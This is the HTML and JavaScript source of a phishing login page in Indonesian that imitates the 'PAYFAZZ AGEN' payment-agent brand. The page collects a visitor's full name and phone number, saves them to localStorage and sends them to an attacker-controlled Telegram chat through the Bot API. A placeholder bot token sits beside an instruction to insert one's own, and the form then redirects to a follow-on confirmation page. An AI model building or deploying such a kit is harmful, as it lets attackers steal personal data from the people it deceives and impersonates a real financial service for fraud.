<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - PAYFAZZ AGEN</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; }
        .gradient-bg { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
    </style>
</head>
<body class="bg-gray-50">
    <div class="min-h-screen gradient-bg">
        <!-- Header -->
        <header class="text-center pt-8 pb-6">
            <div class="text-white text-2xl font-bold mb-2">FAZZ AGEN</div>
            <div class="text-blue-200 text-sm" id="actionTypeText">Masuk ke Akun Anda</div>
        </header>

        <!-- Main Content -->
        <main class="container mx-auto px-4 max-w-md">
            <div class="bg-white rounded-2xl shadow-xl p-8">
                <div class="text-center mb-8">
                    <h2 class="text-2xl font-bold text-gray-800 mb-2">Selamat Datang</h2>
                    <p class="text-gray-600">Masukkan data Anda untuk melanjutkan</p>
                </div>

                <form id="loginForm" class="space-y-6">
                    <div>
                        <label for="nama" class="block text-sm font-medium text-gray-700 mb-2">
                            Nama Lengkap
                        </label>
                        <input 
                            type="text" 
                            id="nama" 
                            name="nama" 
                            required
                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition duration-200"
                            placeholder="Masukkan nama lengkap Anda"
                        >
                    </div>

                    <div>
                        <label for="nohp" class="block text-sm font-medium text-gray-700 mb-2">
                            Nomor Handphone
                        </label>
                        <input 
                            type="tel" 
                            id="nohp" 
                            name="nohp" 
                            required
                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition duration-200"
                            placeholder="08xxxxxxxxxx"
                        >
                    </div>

                    <button 
                        type="submit" 
                        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg transition duration-300 shadow-lg"
                    >
                        Lanjutkan
                    </button>
                </form>

                <div class="text-center mt-6">
                    <a href="index.html" class="text-blue-600 hover:text-blue-800 text-sm">
                        ‚Üê Kembali ke Beranda
                    </a>
                </div>
            </div>
        </main>
    </div>

    <script>
        // Set action type text
        const actionType = localStorage.getItem('actionType') || 'umum';
        const actionTexts = {
            'pesanan': 'Aktifkan Pesanan',
            'pembayaran': 'Aktifkan Pembayaran',
            'kendala': 'Laporan Kendala'
        };
        document.getElementById('actionTypeText').textContent = actionTexts[actionType] || 'Masuk ke Akun Anda';

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const nama = document.getElementById('nama').value;
            const nohp = document.getElementById('nohp').value;
            
            if (nama && nohp) {
                // Store data
                localStorage.setItem('userData', JSON.stringify({
                    nama: nama,
                    nohp: nohp,
                    actionType: actionType,
                    timestamp: new Date().toISOString()
                }));
                
                // Send to Telegram
                sendToTelegram({
                    step: 'login',
                    nama: nama,
                    nohp: nohp,
                    actionType: actionType
                });
                
                // Redirect to confirmation
                window.location.href = 'konfirmasi.html';
            }
        });

        // Telegram Bot Function
        async function sendToTelegram(data) {
            const BOT_TOKEN = '7889876543:AAHxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'; // Ganti dengan token bot Anda
            const CHAT_ID = '-1001234567890'; // Ganti dengan chat ID Anda
            
            const message = `
üîî *Data Login Baru*
üë§ *Nama:* ${data.nama}
üì± *No HP:* ${data.nohp}
üéØ *Aksi:* ${data.actionType}
‚è∞ *Waktu:* ${new Date().toLocaleString('id-ID')}
üìç *Step:* ${data.step}
            `;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (error) {
                console.log('Telegram send error:', error);
            }
        }
    </script>
</body>
</html>
